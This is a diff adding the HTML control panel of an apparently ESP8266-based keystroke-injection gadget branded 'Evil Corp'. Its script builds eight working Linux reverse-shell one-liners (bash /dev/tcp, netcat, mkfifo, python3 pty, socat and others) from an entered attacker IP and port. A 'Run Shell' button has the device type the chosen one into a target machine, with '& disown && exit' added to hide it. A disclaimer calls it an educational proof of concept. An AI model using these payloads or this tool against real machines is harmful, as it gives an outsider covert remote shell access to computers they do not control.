@@ -1,0 +1,928 @@
+<!DOCTYPE html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;300;400;500;700;900&display=swap"
+        rel="stylesheet">
+    <link rel="icon" href="favicon-48x48.png" sizes="48x48" type="image/png">
+    
+
+    <title>Evil Corp</title>
+    <style type="text/css">
+        * {
+            font-family: 'Roboto', sans-serif;
+            font-weight: 300;
+        }
+    
+
+        h2,
+        h3,
+        h4,
+        h5,
+        b {
+            font-weight: 700;
+        }
+
+        h1 {
+            font-weight: 900;
+        }
+
+        button {
+            font-weight: 400;
+        }
+
+        label {
+            font-weight: 500;
+        }
+
+        section {
+            margin: 1.5em;
+            border: 1px solid black;
+            padding: 1em;
+        }
+
+        section>h2 {
+            background-color: white;
+            margin-top: -1.5em;
+            width: max-content;
+            padding: 0 0.5em;
+            margin-left: 0.5em;
+        }
+
+
+        /***************************        Glitch       ***************************/
+        						/*Box-sizing for all elements */
+        /***************************************************************************/
+        *,
+        *::after,
+        *::before {
+            box-sizing: border-box;
+        }
+
+        .stack {
+            display: grid;
+            grid-template-columns: 1fr;
+        }
+
+        .stack span {
+            font-weight: bold;
+            grid-row-start: 1;
+            grid-column-start: 1;
+            font-size: 2rem;
+            --stack-height: calc(100% / var(--stacks) - 1px);
+            --inverse-index: calc(calc(var(--stacks) - 1) - var(--index));
+            --clip-top: calc(var(--stack-height) * var(--index));
+            --clip-bottom: calc(var(--stack-height) * var(--inverse-index));
+            clip-path: inset(var(--clip-top) 0 var(--clip-bottom) 0);
+            animation: stack 340ms cubic-bezier(.46, .29, 0, 1.24) 1 backwards calc(var(--index) * 120ms), glitch 2s ease infinite 2s alternate-reverse;
+        }
+
+        .stack span:nth-child(odd) {
+            --glitch-translate: 8px;
+        }
+
+        .stack span:nth-child(even) {
+            --glitch-translate: -8px;
+        }
+
+        @keyframes stack {
+            0% {
+                opacity: 0;
+                transform: translateX(-50%);
+                text-shadow: -2px 3px 0 red, 2px -3px 0 blue;
+            }
+
+            ;
+
+            60% {
+                opacity: 0.5;
+                transform: translateX(50%);
+            }
+
+            80% {
+                transform: none;
+                opacity: 1;
+                text-shadow: 2px -3px 0 red, -2px 3px 0 blue;
+            }
+
+            100% {
+                text-shadow: none;
+            }
+        }
+
+        @keyframes glitch {
+            0% {
+                text-shadow: -2px 3px 0 red, 2px -3px 0 blue;
+                transform: translate(var(--glitch-translate));
+            }
+
+            2% {
+                text-shadow: 2px -3px 0 red, -2px 3px 0 blue;
+            }
+
+            4%,
+            100% {
+                text-shadow: none;
+                transform: none;
+            }
+        }
+
+		#warningSection {
+			font-size: 15px; 				/* Increase the font size for the section */
+			font-weight: bold; 				/* Make the entire section bold */
+			margin: 10px 0; 				/* Add some spacing */
+		}
+
+		#warningCon {
+			font-weight: normal; 			/* Keep the 'Warning' text normal */
+			font-size: 15px; 				/* Optional: Adjust its size */
+			font-weight: 900;               /* Makes the font bold */
+		}
+
+		#warningContainer.green {
+			color: green; 					/* Green color for the success message */
+			font-size: 14px; 				/* Optional: Adjust its size */
+			font-weight: 500;               /* Makes the font bold */
+		}
+
+		#warningContainer.red {
+			color: #e74c3c; 				/* Light red color for the mkfifo warning */
+			font-size: 14px; 				/* Optional: Adjust its size */
+			font-weight: 500;               /* Makes the font bold */
+		}
+
+        .command-box {
+            display: inline-block;
+            background-color: #f4f4f4;
+            border: 1px solid #ccc;
+            padding: 5px 10px;
+            font-family: monospace;
+            font-size: 12px;
+            margin-left: 10px;
+            border-radius: 4px;
+        }
+        .os-box {
+            display: inline-block;
+            background-color: #f4f4f4;
+            border: 1px solid #ccc;
+            padding: 5px 10px;
+            font-family: monospace;
+            font-size: 12px;
+            margin-left: 10px;
+            border-radius: 4px;
+        }
+
+
+        .tabinator {
+            background: #fff;
+            padding: 40px;
+        }
+
+        .tabinator > input {
+        display: none;
+        }
+
+        .tabinator > label {
+            box-sizing: border-box;
+            display: inline-block;
+            padding: 15px 25px;
+            color: #ccc;
+            margin-bottom: -1px;
+            margin-left: -1px;
+        }
+
+        
+
+        .tabinator label:hover {
+        color: #888;
+        cursor: pointer;
+        }
+
+        .tabinator input:checked + label {
+        position: relative;
+        color: #000;
+        background: #fff;
+        border: 1px solid #bbb;
+        border-bottom: 1px solid #fff;
+        border-radius: 5px 5px 0 0;
+        }
+
+        .tabinator input:checked + label:after {
+        display: block;
+        content: '';
+        position: absolute;
+        top: 0; right: 0; bottom: 0; left: 0;
+        box-shadow: 0 0 15px #939393;
+        }
+
+        #content1, #content2, #content3, #content4 {
+        display: none;
+        border-top: 1px solid #bbb;
+        padding: 15px;
+        }
+
+        #tab1:checked ~ #content1,
+        #tab2:checked ~ #content2,
+        #tab3:checked ~ #content3 {
+        display: block;
+        box-shadow: 0 0 15px #939393;
+        }
+
+
+        #tt-symbol {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            font-size: 10px;
+            border-radius: 5px;
+        }
+
+
+        textarea {
+		    min-width: 20%;
+		    max-width: 50%;
+		    min-height: 120px;  			/* minimum height, used when there is not a lot of text */
+    		max-height: 300px;  			/* Maximum height */
+		    padding: 10px;
+		    border: 1px solid #ccc;
+		    border-radius: 4px;
+		    font-size: 14px;
+		    line-height: 1.5;
+		    resize: vertical;
+		    margin-bottom: 20px;
+		}
+
+		textarea[readonly] {
+		    background-color: #f9f9f9;
+		}
+		
+		button:hover {
+		    background-color: #2980b9;
+		}
+
+		button:active {
+		    background-color: #1abc9c;
+		}
+        
+        
+        
+    </style>
+</head>
+
+<body>
+
+<!--    
+        Creating radio buttons for tabs.
+        Each input element represents a tab, and they share the same "name" attribute 
+        to ensure that only one tab is active at a time.
+        -----------------------------------------------------------------------------    -->
+    <div class = "tabinator">
+        <input type = "radio" id = "tab1" name = "tabsGroup" checked>
+        <label for = "tab1">Reverse Shell</label>
+        <input type = "radio" id = "tab2" name = "tabsGroup">
+        <label for = "tab2">Info</label>
+        <input type = "radio" id = "tab3" name = "tabsGroup">
+        <label for = "tab3">About</label>
+
+        
+
+<!--    First tab: "Reverse Shell"
+        - ID: "tab1" (used as a reference for the label)
+        - name="tabsGroup" ensures that only one tab can be selected at a time
+        - checked attribute sets this tab as the default active tab             
+        ----------------------------------------------------------------------    -->
+        
+        <div class="tab-content" id="content1">
+
+    <header>
+
+        <!-- Section displaying a stacked "Evil Corp" text effect -->
+        <div class="container">
+            <div class="stack" style="--stacks: 3;">
+            
+            
+            <!-- Repeated text for visual stacking effect -->
+            <span style="--index: 0;">Evil Corp</span>
+            <span style="--index: 1;">Evil Corp</span>
+            <span style="--index: 2;">Evil Corp</span>
+            </div>
+        </div>
+        <br>
+
+        <div class="TextScramble_container">
+            <div class="text"></div>
+         </div>
+    </header>
+
+    <section>
+        <h2>Settings</h2>
+        <label for="delay">Enter IP Address:</label>
+        <input type="text" id="ipInput" name="ipInput" value="127.0.0.1">
+
+
+        
+        <label for="delay_end">Set port:</label>
+        <input type="text" id="portInput" name="portInput" value="9001">
+        <br>(Default ip addr is 127.0.0.1 and default port is 9001 )
+		<br><br>
+        <!-- Button to update the IP and port -->
+        <button type="button" class="btn" id="runBtn" onclick="updateIPPort()">Set ip&port</button>
+
+        <br><br>
+    </section>
+
+
+    <section>
+        <h2>Choose Reverse Shell</h2>
+        <br>
+
+        <label for="flash_page_address">Shell Type:</label>
+        <!-- Dropdown menu for selecting the shell type -->
+        <select id="shellTypeDropdown" onchange="updateOperatingSystemText(); updateExampleCommand(); updateIPPort(); checkWarning();">
+
+            <!-- Options for different shell types -->
+            <option value="none" selected>none</option>
+            <option value="bash">bash -i</option>
+            <option value="mkfifo">nc mkfifo</option>
+            <option value="nc">nc -e</option>
+            <option value="python3">python3</option>
+            <option value="socat">socat</option>
+            <option value="socat-tty">socat-tty</option>
+            <option value="sh-196">sh-196</option>
+            <option value="sh-loop">sh-loop</option>
+        </select>
+
+        <br><br>      
+
+        <label for="flash_file">Example Command:</label>
+        <!-- Displays example command for the selected shell -->
+        <div class="command-box" id="reverseShellText"></div>
+
+        <br><br>
+
+        <label for="flash_file_offset">Operating System:</label>
+        <!-- Displays the operating system associated with the selected shell -->
+        <div class="os-box" id="operatingSystemText">Linux</div>
+        
+        <br><br>
+
+        <button onclick="send_revShell('/run_shell')">Run Shell</button>
+        <br><br>
+    </section>
+
+     <section>
+        <h2>Warnings</h2>
+
+        <div class="warning">
+            <!-- Warning section -->
+            <div id="warningSection">
+                <div id="warningContainer"></div>
+            </div>
+        </div>
+    </section>
+
+    
+    <section>
+        <h2>Description</h2>
+        <p>This project uses an <strong>ESP8266</strong> module to send commands to a <strong>CH9329</strong> USB keyboard emulator, enabling it to simulate keystrokes.</p>
+                
+        <h3>Functionality</h3>
+        <ul>
+            <li>Configure the reverse shell by specifying the target <strong>IP address</strong> and <strong>port</strong>.</li>
+            <li>Send keyboard input using CH9329 HID commands.</li>
+        </ul>
+
+        <br>
+    </section>
+
+        <br><br>
+
+
+    <div id="tt-symbol">TT</div>
+</div>
+
+
+
+
+
+ <!--   Second tab: "About"
+        - ID: "tab2" (used as a reference for the label)
+        -------------------------------------------------    -->
+
+<div class="tab-content" id="content2">
+
+    <header>
+
+        <!-- Section displaying a stacked "Evil Corp" text effect -->
+        <div class="container">
+            <div class="stack" style="--stacks: 3;">
+            
+            
+            <!-- Repeated text for visual stacking effect -->
+            <span style="--index: 0;">Evil Corp</span>
+            <span style="--index: 1;">Evil Corp</span>
+            <span style="--index: 2;">Evil Corp</span>
+            </div>
+        </div>
+    </header>
+
+    <br>
+
+    <!-- Main content for the about page -->
+ 
+ 	<button onclick="send_systemInfo('/system_info')">Get Info</button>
+	
+	<br><br>
+    
+    <section>
+		<h2>ESP System Information</h2>
+		
+		<br>
+			<label for="system_info">ESP8266 System Information:</label>
+		<br>
+			<textarea id="system_info" rows="6" cols="40" readonly></textarea>
+	</section>
+	
+		
+	<section>
+		<h2>ESP Memory Information</h2>
+		<br>
+			<label for="mem_info">ESP8266 Memory Information:</label>
+		<br>
+			<textarea id="mem_info" rows="2" cols="40" readonly></textarea>
+		
+		<br><br>
+	</section>
+
+
+	<section>
+		<h2>WiFi Information</h2>
+		<br>
+		<label for="wifi_info">WiFi Network Information:</label>
+		<br>
+		<textarea id="wifi_info" rows="2" cols="40" readonly></textarea>
+		<br><br>
+	</section>
+
+</div>
+
+
+
+
+
+ <!--   Third tab: "About"
+        - ID: "tab3" (used as a reference for the label)
+        -------------------------------------------------    -->
+
+<div class="tab-content" id="content3">
+
+    <header>
+
+        <!-- Section displaying a stacked "Evil Corp" text effect -->
+        <div class="container">
+            <div class="stack" style="--stacks: 3;">
+            
+            
+            <!-- Repeated text for visual stacking effect -->
+            <span style="--index: 0;">Evil Corp</span>
+            <span style="--index: 1;">Evil Corp</span>
+            <span style="--index: 2;">Evil Corp</span>
+            </div>
+        </div>
+    </header>
+
+    <br>
+
+    <!-- Main content for the about page -->
+    <section>
+        <h2>About</h2>
+        <h3>Disclaimer:</h3>
+       
+        <ul>
+            <li>This project is a Proof of Concept (POC) designed for educational purposes only.</li>
+            <li>It is intended solely for testing and research in a controlled environment.</li>
+            <li>The author bears no responsibility for any misuse, illegal activity, or consequences arising from this project.</li>
+            <li>By using this PoC, you acknowledge that you are responsible for ensuring compliance with all applicable laws, regulations, and ethical guidelines.</li>
+            <li>Unauthorized use in a production environment or against systems without explicit permission may violate legal and ethical standards. </li>
+            <li>Use at your own risk.</li>
+            &nbsp;
+            <li>Follow me on <a href="https://medium.com/@im0nk3yar0und" target="_blank">Medium</a></li>
+            <li>Check out my <a href="https://github.com/Im0nk3yar0und" target="_blank">GitHub</a> for more projects.</li>
+        </ul>
+      
+    </section>
+
+</div>
+
+
+
+
+<script>
+
+
+/**
+ * This script defines an asynchronous function `send()` that is responsible 
+ * for sending a POST request to a given URL with form data encoded as 
+ * `application/x-www-form-urlencoded`.
+ * 
+ * The function first collects the values from the HTML input elements with 
+ * IDs `shellTypeDropdown`, `ipInput`, and `portInput` and appends them as 
+ * parameters to a `URLSearchParams` object.
+ * 
+ * It then makes a POST request using the `fetch()` API, passing the URL, 
+ * the method as POST, and the data in the body of the request as a URL-encoded 
+ * string. The request's headers indicate that the content type is 
+ * `application/x-www-form-urlencoded`.
+ * 
+ * If the request is successful, the function waits for the response text 
+ * and updates the `answerDiv` element with the response. If an error occurs 
+ * during the request, the error message is displayed in the `answerDiv`.
+ * 
+ * @param {string} url - The URL to which the POST request will be sent.
+ */
+async function send_revShell(url) {
+    try {
+        const params = new URLSearchParams();
+        params.append('shell', document.getElementById("shellTypeDropdown").value);
+        params.append('ip', document.getElementById("ipInput").value);
+        params.append('port', document.getElementById("portInput").value);
+
+        const resp = await fetch(url, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            body: params.toString() // Data in the form of a URL-encoded string
+        });
+
+        const data = await resp.text();
+        answerDiv.innerHTML = data;
+    } catch (err) {
+        answerDiv.innerHTML = "ERROR: " + err;
+    }
+}
+
+
+// Function to request system information
+function send_systemInfo(url) {
+    fetch(url)
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('system_info').value = data.system_info;
+            document.getElementById('mem_info').value = data.memory_info;
+            document.getElementById('wifi_info').value = data.wifi_info;
+        })
+        .catch(error => {
+            console.error('Error fetching data:', error);
+        });
+}
+
+
+
+
+
+
+    
+// Function to check the selected shell type and display a warning or confirmation
+function checkWarning() {
+    
+    // Get the selected reverse shell type from the dropdown menu
+    const selectedShell = document.getElementById("shellTypeDropdown").value;
+
+    // Reference to the element where the operating system text will be displayed
+    const warningContainerText = document.getElementById("warningContainer");
+
+    // Reset the classes for color before adding new one
+    warningContainerText.classList.remove("green", "red");
+
+    // Update the operating system text based on the selected shell type
+    switch (selectedShell) {
+        case "bash":
+        case "nc":
+        case "python3":
+        case "socat":
+        case "socat-tty":
+        case "sh-196":
+        case "sh-loop":
+            warningContainerText.textContent = "The shell can safely use '& disown && exit' to close the terminal after initiating the shell.";
+            warningContainerText.classList.add("green"); // Add green color class
+            break;
+        case "mkfifo":
+            warningContainerText.innerHTML = 
+                "Using the mkfifo shell type requires the process to remain in the foreground.<br>" +
+                "This means you cannot use '& disown && exit' as it will terminate the shell.<br>" +
+                "This shell keep the terminal open to maintain the connection.";
+            warningContainerText.classList.add("red"); // Add red color class
+            break;
+        default:
+            warningContainerText.textContent = "Unknown shell type selected. Please choose a valid shell type.";
+            warningContainerText.classList.add("red"); // Add red color class
+    }
+    
+    // Debug log
+    // console.log("Checking Warning");
+}
+checkWarning()
+
+
+/**
+ * Updates the operating system display text based on the selected reverse shell type.
+ * This function ensures the user is aware of the shell's compatibility with specific operating systems.
+ */
+ function updateOperatingSystemText() {
+    
+    // Get the selected reverse shell type from the dropdown menu
+    const selectedShell = document.getElementById("shellTypeDropdown").value;
+
+    // Reference to the element where the operating system text will be displayed
+    const operatingSystemText = document.getElementById("operatingSystemText");
+
+    // Update the operating system text based on the selected shell type
+    switch (selectedShell) {
+        case "bash":
+        case "mkfifo":
+        case "nc":
+        case "python3":
+        case "socat":
+        case "socat-tty":
+        case "sh-196":
+        case "sh-loop":
+            operatingSystemText.textContent = "Linux";
+            break;
+        default:
+            operatingSystemText.textContent = "Unknown";
+    }
+    
+    // Debug log
+    // console.log("Update os");
+}
+updateOperatingSystemText()
+
+
+/**
+ * This function updates the reverse shell example command dynamically based on the selected shell type
+ * and the IP address and port entered by the user. It provides real-time feedback to help users
+ * generate the correct reverse shell command tailored to their input.
+ */
+function updateExampleCommand() {
+		// Retrieve input values or default to 127.0.0.1:9001
+		const ipAddress = document.getElementById('ipInput').value || "127.0.0.1";
+		const port = document.getElementById('portInput').value || "9001";
+
+		// Get the selected reverse shell type
+		const selectedShell = document.getElementById("shellTypeDropdown").value;
+
+		// Define shell command templates
+		const shellCommands = {
+		    "bash": `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1 & disown && exit`,
+		    "mkfifo": `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${ipAddress} ${port} >/tmp/f`,
+		    "nc": `nc ${ipAddress} ${port} -e /bin/bash & disown && exit`,
+		    "python3": `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${ipAddress}",${port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")' & disown && exit`,
+		    "socat": `socat TCP:${ipAddress}:${port} EXEC:sh & disown && exit`,
+		    "socat-tty": `socat TCP:${ipAddress}:${port} EXEC:'sh',pty,stderr,setsid,sigint,sane & disown && exit`,
+		    "sh-196": `0<&196;exec 196<>/dev/tcp/${ipAddress}/${port}; sh <&196 >&196 2>&196 & disown && exit`,
+		    "sh-loop": `exec 5<>/dev/tcp/${ipAddress}/${port}; while read line 0<&5; do $line 2>&5 >&5; done & disown && exit`,
+		};
+
+		// Update the reverse shell text
+		document.getElementById('reverseShellText').innerText = shellCommands[selectedShell] || "Invalid shell type selected.";
+		
+		// Debug log
+        // console.log("Updating example command");
+	}
+
+// Add event listeners to update the command in real time
+//document.getElementById("ipInput").addEventListener("input", updateExampleCommand);
+//document.getElementById("portInput").addEventListener("input", updateExampleCommand);
+document.getElementById("shellTypeDropdown").addEventListener("change", updateExampleCommand);
+
+// Initial update when page loads
+updateExampleCommand();
+
+
+
+
+
+/**
+ * This function updates the reverse shell command based on the entered IP address, port, and selected shell type.
+ * It dynamically generates the reverse shell command and updates the displayed text based on user input, providing
+ * the correct format for executing a reverse shell in various shell environments.
+ */
+	function updateIPPort() {
+		const ipAddress = document.getElementById('ipInput').value || "127.0.0.1";
+		const port = document.getElementById('portInput').value || "9001";
+		const shellType = document.getElementById("shellTypeDropdown").value;
+
+		if (!isValidIP(ipAddress)) {
+		    alert("Please enter a valid IP address.");
+		    return;
+		}
+
+		if (!isValidPort(port)) {
+		    alert("Please enter a valid port number (1-65535).");
+		    return;
+		}
+
+		const commands = {
+		    "bash": `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1 & disown && exit`,
+		    "mkfifo": `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${ipAddress} ${port} >/tmp/f`,
+		    "nc": `nc ${ipAddress} ${port} -e /bin/bash & disown && exit`,
+		    "python3": `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${ipAddress}",${port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")' & disown && exit`,
+		    "socat": `socat TCP:${ipAddress}:${port} EXEC:sh & disown && exit`,
+		    "socat-tty": `socat TCP:${ipAddress}:${port} EXEC:'sh',pty,stderr,setsid,sigint,sane & disown && exit`,
+		    "sh-196": `0<&196;exec 196<>/dev/tcp/${ipAddress}/${port}; sh <&196 >&196 2>&196 & disown && exit`,
+		    "sh-loop": `exec 5<>/dev/tcp/${ipAddress}/${port}; while read line 0<&5; do $line 2>&5 >&5; done & disown && exit`,
+		};
+
+		document.getElementById('reverseShellText').innerText = commands[shellType] || "Invalid shell type selected";
+		
+		// Debug log
+        // console.log("Selected reverse shell:", commands[shellType]);
+	}
+
+    function isValidIP(ip) {
+    
+    	// Debug log
+        // console.log("Checking IP:", ip);
+        
+        const octets = ip.split(".");
+        if (octets.length !== 4) return false;
+        
+        return octets.every(octet => {
+            if (!/^\d+$/.test(octet)) return false;
+            const num = parseInt(octet, 10);
+            return num >= 0 && num <= 255;
+        });
+    }
+
+    function isValidPort(port) {
+    
+     	// Debug log
+        // console.log("Checking Port:", port);
+        
+        const num = Number(port);
+        return Number.isInteger(num) && num >= 1 && num <= 65535;
+    }
+
+    
+
+
+/**
+ * The TextScramble function emulates the iconic effect from The Matrix, where text 
+ * transitions through random characters before revealing the final message. 
+ * 
+ * The animation gradually replaces the current characters with random symbols from a 
+ * predefined set until it matches the target text. 
+ * 
+ * This dynamic effect resembles digital code decrypting in real time, creating a 
+ * visually striking "hacker-style" appearance.
+ */
+	class TextScramble {
+		constructor(el) {
+		    this.el = el
+		    
+		    // Characters for the scrambling effect
+		    this.chars = '!<>-_\\/[]{}—=+*^?#________'
+		    
+		    // Bind the update method
+		    this.update = this.update.bind(this)
+		}
+		
+		// Set the text to be displayed with a scramble effect
+		setText(newText) {
+		
+			// Get the current text
+		    const oldText = this.el.innerText
+		    
+		    // Determine the longest text length
+		    const length = Math.max(oldText.length, newText.length)
+		    
+		    // Promise for when animation completes
+		    const promise = new Promise((resolve) => this.resolve = resolve)
+		    this.queue = []
+		    for (let i = 0; i < length; i++) {
+		        const from = oldText[i] || ''								// Current character or empty
+		        const to = newText[i] || ''									// Target character or empty
+		        const start = Math.floor(Math.random() * 40)				// Random start frame
+		        const end = start + Math.floor(Math.random() * 40)			// Random end frame
+		        this.queue.push({ from, to, start, end });
+		    }
+		    
+		    // Stop any ongoing animation
+		    cancelAnimationFrame(this.frameRequest)
+		    this.frame = 0										// Reset the frame counter
+		    this.update()										// Start the update loop
+		    return promise										// Return the promise
+		}
+		
+		
+		// Update the text display
+		update() {
+		    let output = ''										// The updated text to display
+		    let complete = 0									// Count of completed characters
+		    
+		    for (let i = 0, n = this.queue.length; i < n; i++) {
+		        let { from, to, start, end, char } = this.queue[i];
+
+
+		        if (this.frame >= end) {
+		            complete++
+		            output += to										// Add the final character if animation is done
+		        } else if (this.frame >= start) {
+		            if (!char || Math.random() < 0.28) {
+		                char = this.randomChar()						// Generate a random character
+		                this.queue[i].char = char
+		            }
+		            output += `<span class="dud">${char}</span>`		// Display the scrambling character
+		        } else {
+		            output += from										// Add the original character if animation hasn't started
+		        }
+		    }
+		    
+		    // Update the element's HTML
+		    this.el.innerHTML = output
+		    
+		    
+		    if (complete === this.queue.length) {
+		        this.resolve()													// Resolve the promise if all characters are done
+		    } else {
+		        this.frameRequest = requestAnimationFrame(this.update)			// Continue the animation
+		        this.frame++
+		    }
+		}
+		
+    	// Generate a random character
+		randomChar() {
+		    return this.chars[Math.floor(Math.random() * this.chars.length)]
+		}
+	}
+
+
+
+	// Phrases
+	const phrases = [
+		'Neo,',
+		'sooner or later',
+		'you\'re going to realize',
+		'just as I did',
+		'that there\'s a difference',
+		'between knowing the path',
+		'and walking the path',
+		'The Matrix has you.',
+		'Free your mind.',
+		'There is no spoon.',
+		'What is real?',
+		'The one is not a savior, but a choice.',
+		'It’s not about understanding, it’s about believing.',
+		'Reality is just a matter of perception.',
+		'The red pill is the only way out.',
+		'You’ve been living in a dream world.'
+	]
+
+	const el = document.querySelector('.text')			// Target the element with class 'text'
+	const fx = new TextScramble(el)
+
+	let counter = 0										// Start with the first phrase
+	
+	// Function to cycle through the phrases
+	const next = () => {
+		fx.setText(phrases[counter]).then(() => {
+		
+			// Wait 3 seconds before the next phrase
+		    setTimeout(next, 3000)		
+		})
+		
+		// Loop back to the start when all phrases are done
+		counter = (counter + 1) % phrases.length
+	}
+
+	// Start the animation
+	next()
+
+
+/*
+ * TT - This script adds a fixed "TT" symbol in the bottom right corner of the page.
+ * When the user clicks on the symbol while holding the Ctrl key, they are redirected to a specified URL.
+ * The script listens for the click event and checks if the Ctrl key is pressed before executing the redirection.
+ */
+    document.addEventListener("DOMContentLoaded", function() {
+            const ttSymbol = document.getElementById("tt-symbol");
+            
+            ttSymbol.addEventListener("click", function(event) {
+                if (event.ctrlKey) {
+                    window.location.href = "https://medium.com/@im0nk3yar0und"; // Replace with the URL where you want to redirect
+                }
+            });
+
+			// Debug log
+            // console.log("ttSymbol");
+    });
+
+</script>
+
+
+</body>
+
+</html>
